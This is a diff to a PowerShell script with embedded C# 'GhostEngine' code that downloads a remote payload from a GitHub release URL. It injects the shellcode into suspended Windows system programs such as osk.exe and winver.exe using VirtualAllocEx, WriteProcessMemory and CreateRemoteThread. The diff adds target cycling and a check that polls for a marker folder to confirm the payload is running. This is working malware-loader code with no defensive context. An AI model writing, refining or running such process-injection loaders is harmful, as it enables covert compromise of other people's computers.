@@ -4,7 +4,9 @@ $PayloadUrl = "https://github.com/Desantpodtabyret/SecurutyCodex/releases/downlo
 
 $CSharpEngine = @"
 using System;
+using System.IO;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 public class GhostEngine
 {
@@ -28,6 +30,12 @@ public class GhostEngine
 
     [DllImport("kernel32.dll")]
     static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     struct STARTUPINFO
@@ -61,14 +69,47 @@ public class GhostEngine
         public int dwThreadId;
     }
 
-	static string[] targets = new string[] {
-		@"C:\Windows\System32\colorcpl.exe",
-		@"C:\Windows\System32\winver.exe",
-		@"C:\Windows\System32\cttune.exe",
-		@"C:\Windows\System32\osk.exe"
+    static string[] targets = new string[] {
+        @"C:\Windows\System32\colorcpl.exe",
+        @"C:\Windows\System32\winver.exe",
+        @"C:\Windows\System32\cttune.exe",
+        @"C:\Windows\System32\osk.exe"
     };
 
+    // Healthcheck marker: if this folder doesn't appear, injection failed
+    static string markerFolder = @"C:\Windows\Global\cook";
+    static int waitTimeoutMs = 45000;    // 45 seconds total wait
+    static int checkIntervalMs = 2000;   // check every 2 seconds
+
     public static bool Inject(byte[] shellcode, ref string log)
+    {
+        foreach (string target in targets)
+        {
+            if (!File.Exists(target))
+            {
+                log += "[*] Skip (not found): " + target + "\n";
+                continue;
+            }
+
+            log += "[*] Trying target: " + Path.GetFileName(target) + "\n";
+            bool success = TryInjectTarget(target, shellcode, ref log);
+
+            if (success)
+            {
+                log += "[+] SUCCESS: marker folder detected at " + markerFolder + "\n";
+                return true;
+            }
+            else
+            {
+                log += "[-] Target failed healthcheck. Moving to next.\n";
+            }
+        }
+
+        log += "[-] All targets exhausted. No marker folder created.\n";
+        return false;
+    }
+
+    static bool TryInjectTarget(string target, byte[] shellcode, ref string log)
     {
         STARTUPINFO si = new STARTUPINFO();
         si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
@@ -76,73 +117,99 @@ public class GhostEngine
         si.wShowWindow = 0;
 
         PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-        bool created = false;
 
-        foreach (string target in targets)
-        {
-            if (!System.IO.File.Exists(target))
-            {
-                log += "[*] Skip (not found): " + target + "\n";
-                continue;
-            }
-
-            created = CreateProcess(target, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
-
-            if (created)
-            {
-                log += "[+] Process created | " + target + " | PID: " + pi.dwProcessId + "\n";
-                break;
-            }
-            else
-            {
-                log += "[*] Failed: " + target + " | err: " + Marshal.GetLastWin32Error() + "\n";
-            }
-        }
+        bool created = CreateProcess(target, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
 
         if (!created)
         {
-            log += "[-] All targets failed.\n";
+            log += "  [-] CreateProcess failed: " + Marshal.GetLastWin32Error() + "\n";
             return false;
         }
 
+        log += "  [+] Process spawned | PID: " + pi.dwProcessId + "\n";
+
         try
         {
+            // Allocate
             IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
-
             if (alloc == IntPtr.Zero)
             {
-                log += "[-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error() + "\n";
+                log += "  [-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error() + "\n";
                 TerminateProcess(pi.hProcess, 0);
                 return false;
             }
 
-            log += "[+] Memory allocated | 0x" + alloc.ToInt64().ToString("X") + "\n";
-
+            // Write
             int bytesWritten;
-            bool writeRes = WriteProcessMemory(pi.hProcess, alloc, shellcode, shellcode.Length, out bytesWritten);
-
-            if (!writeRes || bytesWritten != shellcode.Length)
+            if (!WriteProcessMemory(pi.hProcess, alloc, shellcode, shellcode.Length, out bytesWritten))
             {
-                log += "[-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error() + "\n";
+                log += "  [-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error() + "\n";
                 TerminateProcess(pi.hProcess, 0);
                 return false;
             }
 
-            log += "[+] Shellcode written | " + bytesWritten + " bytes\n";
-
+            // Execute
             uint threadId;
             IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
-
             if (hThread == IntPtr.Zero)
             {
-                log += "[-] CreateRemoteThread failed: " + Marshal.GetLastWin32Error() + "\n";
+                log += "  [-] CreateRemoteThread failed: " + Marshal.GetLastWin32Error() + "\n";
                 TerminateProcess(pi.hProcess, 0);
                 return false;
             }
 
+            CloseHandle(hThread);
             ResumeThread(pi.hThread);
-            log += "[+] Shellcode executing | TID: " + threadId + "\n";
-            return true;
+            log += "  [+] Shellcode running | TID: " + threadId + "\n";
+
+            // Wait for marker folder to appear
+            log += "  [*] Waiting for marker folder (" + waitTimeoutMs/1000 + "s timeout)...\n";
+
+            int waited = 0;
+            bool markerAppeared = false;
+            bool processDead = false;
+
+            while (waited < waitTimeoutMs)
+            {
+                // Check if process is still alive
+                uint exitCode;
+                GetExitCodeProcess(pi.hProcess, out exitCode);
+                if (exitCode != 259) // STILL_ACTIVE = 259
+                {
+                    processDead = true;
+                    break;
+                }
+
+                // Check marker folder
+                if (Directory.Exists(markerFolder))
+                {
+                    markerAppeared = true;
+                    break;
+                }
+
+                Thread.Sleep(checkIntervalMs);
+                waited += checkIntervalMs;
+            }
+
+            if (markerAppeared)
+            {
+                // Healthcheck passed - payload is alive and working
+                log += "  [+] Marker detected after " + waited + "ms\n";
+                return true;
+            }
+            else if (processDead)
+            {
+                // Process crashed or exited on its own
+                log += "  [-] Process exited prematurely (exit code: " + exitCode + ")\n";
+                return false;
+            }
+            else
+            {
+                // Timeout - payload didn't create marker. Kill this attempt.
+                log += "  [-] Timeout. Marker folder never appeared.\n";
+                TerminateProcess(pi.hProcess, 0);
+                return false;
+            }
         }
         finally
         {
@@ -179,5 +246,5 @@ for ($i = 1; $i -le $maxRetries; $i++) {
 $log = ""
 $success = [GhostEngine]::Inject($shellcode, [ref]$log)
 Write-Output $log
-if ($success) { Write-Output "[SUCCESS] Injection complete." }
-else { Write-Output "[FAILED] Injection aborted." }
+if ($success) { Write-Output "[SUCCESS] Injection verified via marker." }
+else { Write-Output "[FAILED] Marker folder not created." }
